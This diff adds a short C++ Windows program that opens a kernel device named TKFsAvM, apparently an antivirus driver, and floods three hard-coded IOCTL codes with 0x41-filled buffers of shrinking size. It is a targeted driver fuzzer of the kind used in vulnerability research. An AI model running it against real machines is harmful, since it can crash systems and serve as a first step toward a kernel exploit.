@@ -1,0 +1,63 @@
+
+#include "targetver.h"
+#include <stdio.h>
+#include <tchar.h>
+#include <windows.h>
+
+
+
+
+
+
+
+void fuzz_s(HANDLE m_handle, DWORD dwIOCTL)
+{
+	DWORD nbBytes = 0;
+
+	char dw01[0x5] = {0};
+	char szBuf[0x100] = {0};
+	char szOutBuf[0x100] = {0};
+	memset(szBuf, 0x41, 0x100);
+	memset(dw01, 0x31, 0x5);
+
+	for (int iCount = 0xFFFF; 1 < iCount; iCount-- )
+	{
+		char *pSendBuf = new char[iCount];
+		char *pOutBuf = new char[iCount];
+		memset(pSendBuf, 0x41, iCount);
+
+		if (iCount>0x10)
+		{
+			*(DWORD*)pSendBuf = iCount;
+			*(DWORD*)(pSendBuf+4) = iCount-10;
+
+		}
+
+		DeviceIoControl(m_handle, dwIOCTL, (LPVOID)pSendBuf, iCount, (LPVOID)pOutBuf, iCount, &nbBytes, NULL);
+		DeviceIoControl(m_handle, dwIOCTL, (LPVOID)pSendBuf, iCount, (LPVOID)pOutBuf, iCount, &nbBytes, NULL);
+		delete[] pSendBuf;
+		delete[] pOutBuf;
+	}
+
+
+	return ;
+}
+
+
+
+
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	HANDLE m_handle = 0;
+	DWORD nbBytes = 0;
+	m_handle = CreateFileA("\\\\.\\TKFsAvM", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+	fuzz_s(m_handle, 0x220c04);
+	fuzz_s(m_handle, 0x220c1c);
+	fuzz_s(m_handle, 0x220c20);
+
+
+	return 0;
+}
+
